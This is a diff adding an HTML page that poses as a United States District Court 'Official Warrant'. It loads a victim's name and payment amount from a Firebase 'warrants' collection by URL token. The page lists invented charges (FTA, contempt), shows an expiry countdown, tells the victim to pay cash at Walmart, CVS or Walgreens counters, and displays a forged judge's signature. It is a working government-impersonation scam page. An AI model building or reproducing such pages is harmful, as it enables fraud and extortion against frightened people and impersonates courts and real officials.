@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Official Warrant</title>
+    <style>
+        .background-fixed {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-image: url('https://www.dropbox.com/scl/fi/edam2sfy8ayf7ezf5nc1u/Screenshot_20260606-162431_Chrome-1.png?rlkey=ti847k2rro3xlm8t7joq0qrgq&st=x51pl4y2&raw=1');
+            background-size: cover; background-position: center; opacity: 0.25; z-index: -1;
+        }
+        body { font-family: 'Times New Roman', serif; background: #f4f4f4; padding: 20px; margin: 0; }
+        
+        /* Ajuste: rgba(255, 255, 255, 0.8) hace que sea blanco pero transparente */
+        .marco { 
+            width: 800px; 
+            margin: auto; 
+            /* Padding: arriba, derecha, abajo, izquierda. 150px abajo deja espacio libre para el logo */
+            padding: 50px 50px 150px 50px; 
+            background: rgba(255, 255, 255, 0.5); 
+            border: 5px double #333; 
+            position: relative; 
+            min-height: 500px; 
+            z-index: 1; 
+            box-shadow: 0 0 20px rgba(0,0,0,0.2);
+            backdrop-filter: blur(5px);
+        }
+        
+        .timer { color: red; font-weight: bold; text-align: center; margin-bottom: 20px; font-size: 1.2em; }
+        .logo-top { width: 450px; display: block; margin: 0 auto 20px; }
+        .logo-bottom-left { 
+            position: absolute; 
+            bottom: 20px; 
+            left: 50px;      /* Cambiamos 'right' por 'left' */
+            width: 80px;     /* Ajusta este valor para hacerlo más pequeño (80px es un buen tamaño) */
+        }
+        .top-right-text {
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            font-weight: bold;
+            font-size: 30px; /* Tamaño solicitado */
+            color: #333;
+        }
+        /* Texto superior fuera del marco */
+        .titulo-arriba {
+            text-align: center;
+            font-weight: bold;
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+
+        /* Contenedor que mantiene la firma y el texto juntos abajo a la derecha */
+        .contenedor-firma-agrupado {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* El marco pequeño para la firma dentro del grupo */
+        .marco-foto {
+            width: 150px;
+            height: 80px;
+            border: 2px solid #333;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* El texto justo debajo de la firma */
+        .texto-firma {
+            font-weight: bold;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="background-fixed"></div>
+
+    <div class="marco">
+        <div class="top-right-text">CASE #****0293</div>
+        
+        <div id="contador" class="timer">Loading...</div>
+        <img src="https://www.dropbox.com/scl/fi/jjpw6cix0iq2uiutqtusb/Screenshot_20260606-122428_Chrome-1.png?rlkey=mgizpcbx2acyxd0p49tgsnrg8&st=3krrxsze&raw=1" class="logo-top" alt="Logo">
+        
+        <div id="content">
+            <h2 class="title">UNITED STATES DISTRICT COURT</h2>
+            <p style="font-size: 30px;"><strong>Accused:</strong> <span id="display-nombre"></span></p>
+            <p style="font-size: 30px;"><strong>Date:</strong> <span id="display-fecha"></span></p>
+        </div>
+
+        <p><strong>FTA (Failure to Appear):</strong> In a legal context, FTA stands for "Failure to Appear."
+
+What is it? It's the charge filed when a person has been formally summoned by a judge to appear in court on a specific date and time and fails to do so.
+
+Consequences:
+
+Bench Warrant: The judge will immediately issue an arrest warrant for the person.
+Forfeiture of Bail: If the person was free on bail, the judge may order the forfeiture of the bail money.
+Additional Charge: The failure to appear can be prosecuted as a separate offense, adding an extra layer of legal complexity to the original case..</p>
+        <p><strong>Contempt of Court (COC)</strong> Contempt of Court is a legal charge invoked when a person shows disrespect, defies the authority of a court, or willfully disobeys a court order.
+
+In the U.S. justice system, the court is the highest authority in a proceeding; therefore, any action that obstructs, interferes with, or ignores a judge's order is considered a serious offense not only against the opposing party (if any) but also against the judicial system itself.
+Classification of Contempt
+Contempt of Court can be classified in two ways, depending on the judge's intent:
+
+1. Civil Contempt: Its purpose is coercive. It is used to compel a person to comply with a specific order (such as turning over documents, paying alimony, or appearing in court). The judge imposes sanctions (such as jail time or daily fines) that continue until the person decides to comply with the order.
+
+2. Criminal Contempt: Its purpose is punitive.  It is used to punish conduct that has already occurred and that was a direct offense against the dignity or authority of the court (for example, yelling at the judge or deliberately ignoring a subpoena)..</p>
+        <p><strong>Charges applied to the offender</strong></p>
+        <p style="color: red;"><strong>FTA-CV-3254-4526</strong></p>
+        <p style="color: red;"><strong>COC-CV-1159-4626</strong></p>
+        <p><strong>PR BOND</strong></p>
+                <p style="color: green;"><strong>ELIGIBLE</strong></p>
+                <p> A PR bond (Personal Recognizance bond) is a legal agreement in which a judge allows a defendant to post there collateral payment towards active warrants in order for them to be in a non-active stats posting assets as security, in exchange for a written promise to appear at all court hearings.</p>
+                
+<p style="font-size: 30px;"><strong>Court-ordered amount 10% :</strong> <span id="display-monto" style="color: green;"></span></p>
+
+                 <p><strong>PAYMENT PROCESS: There are two methods for making payments to the Supreme Court: online and in-person. The online option uses a payment link on the official website (not available for all cases). The in-person option involves visiting entities authorized by the Court (such as Walmart, CVS, or Walgreens); these payments are made in cash at the money services counter using a barcode generated by our payment system.</strong></p>
+                 <p style="font-size: 30px;"><strong>You must inform the cashier that you wish to add funds to your personal account; they will then ask for the security information required to process the payment. The two options for proceeding are providing a state-issued ID or your personal phone number. Once the payment is successfully completed, the cashier will give you a payment receipt, which you must keep to present at the department kiosk; this receipt serves to confirm the payment made.</strong>
+
+        <img src="https://www.dropbox.com/scl/fi/4l50a0tws931bwdp6bfl1/images.jpeg?rlkey=wuahb11sou0k49y6ogud9svvg&st=vvg0eq7e&raw=1" class="logo-bottom-left" alt="Logo">
+        
+        <div class="contenedor-firma-agrupado">
+            <div class="marco-foto">
+                <img src="https://www.dropbox.com/scl/fi/26edutzxvh9yr0dnhy8v4/OnlineSignatures.net-378-Boasberg-James.E.png?rlkey=fh5b71q15rxczfjrlc4yiyz0b&st=lr86i92g&raw=1" style="max-width: 100%; max-height: 100%;" alt="Signature">
+            </div>
+            <div class="texto-firma">Chief Judge: James E. Boasberg</div>
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyC43TebWDW4tOoiqm7a8DeQNIRg5dWE_Kc",
+            authDomain: "us-supremecourt.firebaseapp.com",
+            projectId: "us-supremecourt",
+            storageBucket: "us-supremecourt.firebasestorage.app",
+            messagingSenderId: "822836110236",
+            appId: "1:822836110236:web:a07dadd46c6f4184fd5e59"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        const token = new URLSearchParams(window.location.search).get('token');
+        
+        if (token) {
+            db.collection("warrants").doc(token).get().then(doc => {
+                if (doc.exists) {
+                    const data = doc.data();
+                    const expiresAt = data.expiresAt.toDate();
+                    document.getElementById('display-nombre').innerText = data.nombre;
+                    document.getElementById('display-fecha').innerText = data.fecha;
+                    
+                    // Aquí se agregó la línea para mostrar el monto sin alterar el resto
+                    document.getElementById('display-monto').innerText = data.monto;
+
+                    const interval = setInterval(() => {
+    const diff = expiresAt - new Date();
+    
+    if (diff <= 0) { 
+        clearInterval(interval); 
+        // Cambia la línea de abajo por la URL a la que quieres que se redirija
+        window.location.href = "https://www.supremecourt.gov/"; 
+    }
+    
+    const min = Math.floor(diff / 60000);
+    const sec = Math.floor((diff % 60000) / 1000);
+    document.getElementById('contador').innerText = `This document expires in ${min}:${sec.toString().padStart(2, '0')}`;
+}, 1000);
+                } else {
+                    document.body.innerHTML = "<h1 style='text-align:center;'>Token invalid or expired</h1>";
+                }
+            });
+        } else {
+            document.body.innerHTML = "<h1 style='text-align:center;'>Error: Access Denied</h1>";
+        }
+    </script>
+</body>
+</html>
